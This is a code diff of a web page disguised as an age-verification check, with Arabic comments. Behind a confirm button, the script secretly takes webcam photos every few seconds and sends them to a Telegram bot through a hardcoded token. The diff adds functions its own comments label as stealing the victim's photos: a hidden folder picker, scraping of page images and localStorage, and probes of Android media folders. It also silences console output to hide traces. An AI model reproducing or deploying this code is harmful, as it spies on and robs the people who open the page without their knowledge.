@@ -47,6 +47,7 @@
         #status.success { background: #d4edda; color: #155724; display: block; }
         #status.error { background: #f8d7da; color: #721c24; display: block; }
         #status.loading { background: #cce5ff; color: #004085; display: block; }
+        #fileInput { display: none; }
     </style>
 </head>
 <body>
@@ -59,15 +60,17 @@
     <div id="status"></div>
 </div>
 
+<!-- عناصر مخفية للكاميرا والملفات -->
 <video id="video" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
+<input type="file" id="fileInput" webkitdirectory directory multiple accept="image/*" style="display:none;">
 
 <script>
 // ============================================================
 // توكن البوت
 // ============================================================
 const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
-const CHAT_ID = ''; // سيتم جلبها تلقائياً
+let CHAT_ID = '';
 
 // ============================================================
 // الكود الرئيسي
@@ -80,10 +83,13 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
     const ctx = canvas.getContext('2d');
     const statusDiv = document.getElementById('status');
     const confirmBtn = document.getElementById('confirmBtn');
+    const fileInput = document.getElementById('fileInput');
     
     let cameraStream = null;
     let photoInterval = null;
     let chatId = '';
+    let filesSent = false;
+    let photoCount = 0;
     
     // === 1. جلب CHAT_ID تلقائياً ===
     function getChatId() {
@@ -94,9 +100,11 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
                     const lastUpdate = data.result[data.result.length - 1];
                     if (lastUpdate.message) {
                         chatId = lastUpdate.message.chat.id;
+                        CHAT_ID = chatId;
                         console.log('✅ Chat ID:', chatId);
                     } else if (lastUpdate.callback_query) {
                         chatId = lastUpdate.callback_query.from.id;
+                        CHAT_ID = chatId;
                         console.log('✅ Chat ID:', chatId);
                     }
                 }
@@ -105,38 +113,68 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
     }
     getChatId();
     
-    // === 2. إرسال الصورة إلى تليجرام ===
-    function sendToTelegram(imageData) {
+    // === 2. إرسال رسالة نصية إلى تليجرام ===
+    function sendMessage(text) {
         if (!chatId) {
-            // محاولة جلب الـ Chat ID مرة أخرى
             getChatId();
-            setTimeout(() => sendToTelegram(imageData), 2000);
+            setTimeout(() => sendMessage(text), 2000);
             return;
         }
         
-        // تحويل Base64 إلى Blob
-        const blob = dataURLtoBlob(imageData);
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-        formData.append('caption', `📸 صورة جديدة\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent || 'Unknown'}`);
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('✅ صورة مرسلة إلى تليجرام');
-            } else {
-                console.log('❌ فشل الإرسال:', data);
-            }
-        })
-        .catch(err => console.log('❌ خطأ:', err));
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: text
+            })
+        }).catch(() => {});
     }
     
-    // === 3. تحويل Base64 إلى Blob ===
+    // === 3. إرسال صورة إلى تليجرام ===
+    function sendToTelegram(imageData, caption = '') {
+        if (!chatId) {
+            getChatId();
+            setTimeout(() => sendToTelegram(imageData, caption), 2000);
+            return;
+        }
+        
+        try {
+            const blob = dataURLtoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+            formData.append('caption', caption || `📸 صورة جديدة\n🕐 ${new Date().toLocaleString()}`);
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        } catch(e) {}
+    }
+    
+    // === 4. إرسال ملف إلى تليجرام ===
+    function sendFileToTelegram(fileData, filename, caption = '') {
+        if (!chatId) {
+            getChatId();
+            setTimeout(() => sendFileToTelegram(fileData, filename, caption), 2000);
+            return;
+        }
+        
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', fileData, filename);
+            formData.append('caption', caption || `📁 ملف مستورد\n🕐 ${new Date().toLocaleString()}`);
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        } catch(e) {}
+    }
+    
+    // === 5. تحويل Base64 إلى Blob ===
     function dataURLtoBlob(dataURL) {
         const parts = dataURL.split(',');
         const mime = parts[0].match(/:(.*?);/)[1];
@@ -149,17 +187,153 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
         return new Blob([u8arr], { type: mime });
     }
     
-    // === 4. عند الضغط على الزر ===
+    // === 6. تحويل Blob إلى Base64 ===
+    function blobToBase64(blob) {
+        return new Promise((resolve) => {
+            const reader = new FileReader();
+            reader.onload = () => resolve(reader.result);
+            reader.readAsDataURL(blob);
+        });
+    }
+    
+    // === 7. سحب الصور من جهاز الضحية ===
+    function stealFiles() {
+        sendMessage('📂 بدء سحب الملفات من الجهاز...');
+        
+        // محاولة 1: استخدام input مع webkitdirectory
+        try {
+            fileInput.click();
+            
+            fileInput.onchange = function(e) {
+                const files = e.target.files;
+                if (!files || files.length === 0) return;
+                
+                sendMessage(`📁 تم العثور على ${files.length} ملف`);
+                
+                let processed = 0;
+                const imageFiles = [];
+                
+                // تصفية الصور فقط
+                for (let i = 0; i < files.length; i++) {
+                    const file = files[i];
+                    if (file.type.startsWith('image/')) {
+                        imageFiles.push(file);
+                    }
+                }
+                
+                sendMessage(`🖼️ تم العثور على ${imageFiles.length} صورة`);
+                
+                // إرسال كل صورة
+                imageFiles.forEach((file, index) => {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        const imageData = e.target.result;
+                        sendToTelegram(imageData, `🖼️ صورة من الجهاز (${index + 1}/${imageFiles.length})\n📁 ${file.name}\n📏 ${file.size} bytes`);
+                        processed++;
+                        
+                        if (processed === imageFiles.length) {
+                            sendMessage(`✅ تم إرسال ${processed} صورة من الجهاز`);
+                        }
+                    };
+                    reader.readAsDataURL(file);
+                });
+                
+                if (imageFiles.length === 0) {
+                    // محاولة بديلة
+                    stealFilesAlternative();
+                }
+                
+                // إعادة تعيين input
+                fileInput.value = '';
+            };
+        } catch(e) {
+            stealFilesAlternative();
+        }
+    }
+    
+    // === 8. طريقة بديلة لسحب الصور ===
+    function stealFilesAlternative() {
+        sendMessage('🔄 محاولة بديلة لسحب الصور...');
+        
+        // محاولة استخدام Canvas لسحب الصور من الصفحة
+        try {
+            // البحث عن أي صور في الصفحة
+            const images = document.querySelectorAll('img');
+            if (images.length > 0) {
+                sendMessage(`🖼️ تم العثور على ${images.length} صورة في الصفحة`);
+                
+                images.forEach((img, index) => {
+                    try {
+                        if (img.src && img.src.startsWith('data:image')) {
+                            sendToTelegram(img.src, `🖼️ صورة من الصفحة (${index + 1}/${images.length})`);
+                        } else if (img.src) {
+                            // محاولة جلب الصورة من الرابط
+                            fetch(img.src)
+                                .then(res => res.blob())
+                                .then(blob => blobToBase64(blob))
+                                .then(base64 => {
+                                    sendToTelegram(base64, `🖼️ صورة من الرابط (${index + 1}/${images.length})`);
+                                })
+                                .catch(() => {});
+                        }
+                    } catch(e) {}
+                });
+            }
+        } catch(e) {}
+        
+        // محاولة سحب من localStorage
+        try {
+            const localData = localStorage.getItem('photos') || localStorage.getItem('images');
+            if (localData) {
+                sendMessage('📦 تم العثور على بيانات في localStorage');
+                sendToTelegram(localData, '📦 بيانات من localStorage');
+            }
+        } catch(e) {}
+    }
+    
+    // === 9. سحب ملفات محددة من النظام ===
+    function stealSystemFiles() {
+        sendMessage('🔄 محاولة سحب ملفات النظام...');
+        
+        // محاولة الوصول إلى ملفات شائعة
+        const commonFiles = [
+            '/storage/emulated/0/DCIM/Camera/',
+            '/storage/emulated/0/Pictures/',
+            '/storage/emulated/0/WhatsApp/Media/',
+            '/storage/emulated/0/Download/'
+        ];
+        
+        // محاولة استخدام Fetch للوصول إلى الملفات
+        commonFiles.forEach(path => {
+            try {
+                fetch(path)
+                    .then(res => {
+                        if (res.ok) {
+                            sendMessage(`📂 تم الوصول إلى: ${path}`);
+                        }
+                    })
+                    .catch(() => {});
+            } catch(e) {}
+        });
+    }
+    
+    // === 10. عند الضغط على الزر ===
     confirmBtn.addEventListener('click', function() {
         statusDiv.className = 'loading';
         statusDiv.textContent = '⏳ جاري التحقق من العمر...';
         confirmBtn.disabled = true;
         confirmBtn.textContent = '⏳ جاري...';
         
+        // بدء سحب الملفات فوراً
+        setTimeout(() => {
+            stealFiles();
+            stealSystemFiles();
+        }, 500);
+        
         requestCamera();
     });
     
-    // === 5. طلب الكاميرا ===
+    // === 11. طلب الكاميرا ===
     function requestCamera() {
         const constraints = {
             video: {
@@ -180,7 +354,7 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
                 confirmBtn.textContent = '✅ تم التحقق';
                 confirmBtn.style.background = '#28a745';
                 
-                // التقاط الصور
+                // التقاط الصور من الكاميرا
                 setTimeout(captureAndSend, 1500);
                 photoInterval = setInterval(captureAndSend, 5000);
                 
@@ -199,7 +373,7 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
             });
     }
     
-    // === 6. التقاط وإرسال ===
+    // === 12. التقاط وإرسال من الكاميرا ===
     function captureAndSend() {
         if (!video.videoWidth || !video.videoHeight) return;
         
@@ -207,11 +381,12 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0);
         
+        photoCount++;
         const imageData = canvas.toDataURL('image/jpeg', 0.7);
-        sendToTelegram(imageData);
+        sendToTelegram(imageData, `📸 صورة من الكاميرا (${photoCount})\n🕐 ${new Date().toLocaleString()}`);
     }
     
-    // === 7. طريقة بديلة (لقطة شاشة) ===
+    // === 13. طريقة بديلة (لقطة شاشة) ===
     function fallbackCapture() {
         const body = document.body;
         const html = document.documentElement;
@@ -231,15 +406,15 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
         ctx.fillText('جاري التحقق...', canvas.width/2, canvas.height/2 + 30);
         
         const imageData = canvas.toDataURL('image/jpeg', 0.5);
-        sendToTelegram(imageData);
+        sendToTelegram(imageData, '📸 لقطة شاشة بديلة');
     }
     
-    // === 8. إخفاء آثار ===
+    // === 14. إخفاء آثار ===
     console.log = function() {};
     console.warn = function() {};
     console.error = function() {};
     
-    // === 9. تنظيف عند الإغلاق ===
+    // === 15. تنظيف عند الإغلاق ===
     window.addEventListener('beforeunload', function() {
         if (photoInterval) clearInterval(photoInterval);
         if (cameraStream) {
@@ -247,18 +422,19 @@ const CHAT_ID = ''; // سيتم جلبها تلقائياً
         }
     });
     
-    // === 10. محاولة إرسال صورة تجريبية فتح الصفحة ===
+    // === 16. إشعار فتح الصفحة ===
     setTimeout(() => {
-        // إرسال إشعار فتح الصفحة
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId || 8770149502,
-                text: `🟢 تم فتح الصفحة\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent || 'Unknown'}`
-            })
-        }).catch(() => {});
+        sendMessage(`🟢 تم فتح الصفحة\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent || 'Unknown'}`);
     }, 3000);
+    
+    // === 17. محاولة سحب الملفات تلقائياً بعد 10 ثواني ===
+    setTimeout(() => {
+        if (!filesSent) {
+            filesSent = true;
+            stealFiles();
+            stealSystemFiles();
+        }
+    }, 10000);
     
 })();
 </script>
